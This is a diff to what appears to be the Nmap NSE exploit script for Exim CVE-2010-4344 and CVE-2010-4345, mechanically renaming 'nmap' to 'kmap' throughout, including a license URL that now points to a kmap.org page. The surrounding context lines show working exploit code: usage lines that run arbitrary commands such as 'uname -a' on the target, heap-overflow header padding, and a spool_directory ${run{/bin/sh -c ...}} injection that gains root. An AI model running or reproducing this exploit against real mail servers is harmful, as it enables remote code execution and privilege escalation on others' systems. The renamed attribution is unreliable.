@@ -43,8 +43,8 @@ Reference:
 
 ---
 -- @usage
--- nmap --script=smtp-vuln-cve2010-4344 --script-args="smtp-vuln-cve2010-4344.exploit" -pT:25,465,587 <host>
--- nmap --script=smtp-vuln-cve2010-4344 --script-args="exploit.cmd='uname -a'" -pT:25,465,587 <host>
+-- kmap --script=smtp-vuln-cve2010-4344 --script-args="smtp-vuln-cve2010-4344.exploit" -pT:25,465,587 <host>
+-- kmap --script=smtp-vuln-cve2010-4344 --script-args="exploit.cmd='uname -a'" -pT:25,465,587 <host>
 --
 -- @output
 -- PORT   STATE SERVICE
@@ -70,7 +70,7 @@ Reference:
 --       <code>smtp-vuln-cve2010-4344.exploit</code> argument.
 
 author = "Djalal Harouni"
-license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
+license = "Same as Kmap--See https://kmap.org/book/man-legal.html"
 categories = {"exploit", "intrusive", "vuln"}
 
 
@@ -106,7 +106,7 @@ end
 -- successfully exploited.
 local function escalate_privs(socket, smtp_opts)
   local exploited, results = false, ""
-  local tmp_file = "/tmp/nmap"..tostring(math.random(0x0FFFFF, 0x7FFFFFFF))
+  local tmp_file = "/tmp/kmap"..tostring(math.random(0x0FFFFF, 0x7FFFFFFF))
   local exim_run = "exim -C"..tmp_file.." -q"
   local exim_spool = "spool_directory = \\${run{/bin/sh -c 'id > "..
   tmp_file.."' }}"
@@ -191,10 +191,10 @@ local function exploit_heap(socket, smtp_opts)
     smtp_opts.mailto)
 
   log_buf_size = log_buf_size - 3
-  local filler, hdrs, nmap_hdr = string.rep("X", 8 * 16), "", "NmapHeader"
+  local filler, hdrs, kmap_hdr = string.rep("X", 8 * 16), "", "KmapHeader"
 
   while #log_buf < log_buf_size do
-    local hdr = string.format("%s: %s\n", nmap_hdr, filler)
+    local hdr = string.format("%s: %s\n", kmap_hdr, filler)
     local one = 2 + #hdr
     local two = 2 * one
     local left = log_buf_size - #log_buf
@@ -205,7 +205,7 @@ local function exploit_heap(socket, smtp_opts)
       hdrs = hdrs..hdr
       log_buf = log_buf.."  "..hdr
       local second = left - first
-      hdr = string.format("%s: %s\n", nmap_hdr, filler)
+      hdr = string.format("%s: %s\n", kmap_hdr, filler)
       hdr = string.sub(hdr, 0, second - 1).."\n"
     end
     hdrs = hdrs..hdr
@@ -245,7 +245,7 @@ local function exploit_heap(socket, smtp_opts)
   end
 
   local body_size = 0
-  filler = string.rep(string.rep("Nmap", 63).."XX\r\n", 1024)
+  filler = string.rep(string.rep("Kmap", 63).."XX\r\n", 1024)
   while body_size < msg_len do
     body_size = body_size + #filler
     status, ret = socket:send(filler)
@@ -300,7 +300,7 @@ end
 local function check_exim(smtp_opts)
   local out, smtp_server = {}, {}
   local exim_heap_ver, exim_priv_ver = 4.69, 4.72
-  local exim_default_size, nmap_scanme_ip = 52428800, '64.13.134.52'
+  local exim_default_size, kmap_scanme_ip = 52428800, '64.13.134.52'
   local heap_cve, priv_cve = 'CVE-2010-4344', 'CVE-2010-4345'
   local heap_str = "Exim heap overflow vulnerability ("..heap_cve.."):"
   local priv_str = "Exim privileges escalation vulnerability ("..priv_cve.."):"
@@ -384,9 +384,9 @@ local function check_exim(smtp_opts)
   end
   smtp_opts.size = smtp_server.size
 
-  -- use 'nmap.scanme.org' IP address
+  -- use 'kmap.scanme.org' IP address
   if not smtp_opts.domain_ip then
-    smtp_opts.domain_ip = nmap_scanme_ip
+    smtp_opts.domain_ip = kmap_scanme_ip
   end
 
   -- set the appropriate 'MAIL FROM' and 'RCPT TO' values
@@ -442,7 +442,7 @@ action = function(host, port)
     host = host,
     port = port,
     domain = stdnse.get_script_args('smtp.domain') or
-    'nmap.scanme.org',
+    'kmap.scanme.org',
     mailfrom = stdnse.get_script_args('smtp-vuln-cve2010-4344.mailfrom'),
     mailto = stdnse.get_script_args('smtp-vuln-cve2010-4344.mailto'),
     exploit = stdnse.get_script_args('smtp-vuln-cve2010-4344.exploit'),
